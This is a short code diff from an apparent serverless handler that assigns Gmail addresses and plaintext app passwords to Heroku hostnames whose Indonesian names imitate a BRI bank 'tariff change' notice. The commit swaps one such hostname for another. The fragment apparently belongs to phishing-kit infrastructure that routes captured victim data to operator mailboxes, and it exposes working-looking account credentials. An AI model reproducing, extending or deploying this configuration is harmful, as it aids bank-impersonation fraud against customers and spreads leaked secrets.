@@ -36,7 +36,7 @@ export default function handler(req, res) {
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
-    } else if(url == 'perubahan--bri-tariff.herokuapp.com'){
+    } else if(url == 'ubah--tarif.herokuapp.com'){
         email = 'andarasultan954@gmail.com';
         pass = 'xwjfzwdtiaxfname';
 
